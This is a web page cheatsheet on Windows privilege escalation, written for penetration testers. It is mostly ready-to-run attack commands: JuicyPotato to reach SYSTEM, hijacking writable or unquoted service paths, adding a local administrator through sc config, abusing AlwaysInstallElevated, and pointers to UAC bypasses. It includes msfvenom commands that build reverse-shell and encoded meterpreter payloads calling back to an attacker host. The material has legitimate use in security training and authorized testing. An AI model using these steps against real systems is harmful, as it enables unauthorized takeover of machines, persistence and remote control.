---
layout: page
title: Windows privilege escalation cheatsheet
description: Windows privilege escalation cheatsheet
dropdown: Cheatsheets
priority: 1
---

## System enumeration

**Which OS the target is running? Are there any hot fixes installed?**

```console
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Save the output of _systeminfo_ in _systeminfo.txt_ on your attacking machine and execute the following commands:

```console
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2020-03-09-mssb.xls --systeminfo systeminfo.txt
```

_windows-exploit-suggester.py_ can be found on [AonCyberLabs Github](https://github.com/AonCyberLabs/Windows-Exploit-Suggester).

<div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Info:</h3>
      </div>
      <div class="panel-body">
   Since Microsoft stopped maintaining the security bulletin search; the Windows Exploit Suggester database will not include any vulnerabilities or
exploits found after March 2017. Nevertheless, this is still a usefull tool for older machines.
      </div>
    </div>

Compiled Kernel exploit are available on [SecWiki Github repository](https://github.com/SecWiki/windows-kernel-exploits/).

**Can we exploit 3rd party drivers?**

```console
driverquery /v
```

## User enumeration

**Who am I running as? Which privileges do I have?**

```console
whoami
whoami /all
net user /priv
net user
net user username
```

If the user has SeImpersonate or SeAssignPrimaryToken privileges then you can use [JuicyPotato](https://github.com/ohpe/juicy-potato) and become SYSTEM.

To use the JuicyPotato exploit, run the following:

```console
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```

You can find a CLSID that works for your target from [ohpe Github](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md). You can also change the process to be executed with a reverse shell to your target.

_Note: Windows Server 2019 is not affected by this vulnerability._

## Firewall status and rules enumeration

```console
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```

## Process enumeration  

```console
tasklist /SVC
```

## Insecure file permissions enumeration

**Can we replace a service running as a privileged user? Can we modify its path?**

Run the following command in Powershell and look for weird programs:

```console
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

Once you spot a weird service (Let's refer to it as weird.exe from now on); use _icacls_ to determine if the current user can modify it or not:

```console
icacls "c:\program files\weird.exe"
```

If the user can modify the program; you should see _BUILTIN\Users: (I)(F)_ in the output of the above command. If this is the case; you can replace the program with a malicious one (same name) and restart it:

```console
net stop weird
```

If you do not have permission to restart the program; check its start mode. If it's automatic;you can restart the machine instead:

```console
wmic service where caption="weird" get name, caption, state, startmode
shutdown /r /t 0
```

Another way to exploit a misconfigured service is by changing its path using _sc config_ command.

```console
sc config [service name] binpath= "malicious executable path"
```

You can even exploit the path to add a new admin user:

```console
sc config [service name] binpath= "net user admin password /add"
sc config [service name] binpath= "net localgroup Administrators admin /add"
```

You will need to restart the service for the exploit to work:

```console
sc stop [service name]
sc start [service name]
```

_Note: [accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) is also a very useful tool to check for service permissions on Windows._

```console
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

If the authenticated user has write permissions to the service; the output of the above command would be: _RW [service name] SERVICE_ALL_ACCESS_

## Unquoted service path enumeration

<div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Info:</h3>
      </div>
      <div class="panel-body">
    If an executable is enclosed in quote tags "";Windows will know where to find it when it attempts to execute it. However, if the executable is not enclosed in quote tags and the path contains one or more spaces; Windows will handle the space as a break and pass the rest of the service path as an argument. If we have write permissions to any of the folders containing spaces, we can exploit the unquoted service path vulnerability.
      </div>
    </div>

```console
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Let's say we found an executable located under C:\Program Files\folder A\folder B\executable.exe and its path is not enclosed in quote tags.

Let's see if we have write permissions to any of the folders:

```console
icacls "C:\Program Files\"
icacls "C:\Program Files\folder A"
icacls "C:\Program Files\folder A\folder B"
```

If we had write permissions on the 'C:\' directory we can create the following payload: 'C:\Program.exe'. This is highly unlikely though but it is very common to have write permissions in application directories. If we have permissions to write in the
'C:\Program Files\folder A' directory we will put our reverse shell there and name it folder.exe.

```console
msfvenom -p windows/shell_reverse_tcp LHOST=[LHOST IP] LPORT=443 -f exe -o folder.exe
```

We can now either restart the service or the target if the service start mode is Auto.

## Binaries that auto elevate enumeration

We need to check the status of the AlwaysInstallElevated registry setting. If this key is enabled (set to 1) in either HKEY_CURRENT_USER or HKEY_LOCAL_MACHINE, any user can run Windows Installer packages with elevated privileges.

```console
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Use _msfvenom_ to create a malicious msi installer:

```console
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=[LHOST IP]
LPORT=443 -f msi -o exploit.msi
```

In order to execute the msi installer, run the following:

```console
msiexec /quiet /qn /i C:\Users\exploit.msi
```

*Note:* To exploit this vulnerability with Metasploit you can use exploit/windows/local/always_install_elevated.

## Unattended installs enumeration

<div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Info:</h3>
      </div>
      <div class="panel-body">
    Unattended installations often use a file of predefined answers so that after starting the installation, it runs to completion without further user intervention. If administrators fail to clean up after such a process, an EXtensible Markup Language
(XML) file called Unattend is left on the local system. This file may contain sensitive information.
      </div>
    </div>

Unattended files are most likely found under:

* C:\Windows\Panther\
* C:\Windows\Panther\Unattend\
* C:\Windows\System32\
* C:\Windows\System32\sysprep\

Search the directories for these files:

* Unattend.xml
* Unattended.xml
* Unattend.txt
* sysprep.xml
* sysprep.inf

## UAC bypass

In order to bypass UAC; you need to be part of the administrator's group. Pentestlab published a detailed [blog](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/) on how to accomplish this using foothelper.exe.

*Note: You can bypass UAC with Metasploit using exploit/windows/local/bypassuac.*

## Automated scripts

1. [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
2. [JAWS](https://github.com/411Hall/JAWS)
3. [Powerless](https://github.com/M4ximuss/Powerless)
4. [Watson](https://github.com/rasta-mouse/Watson)
5. [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

### References & Further readings

* [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)
* [https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)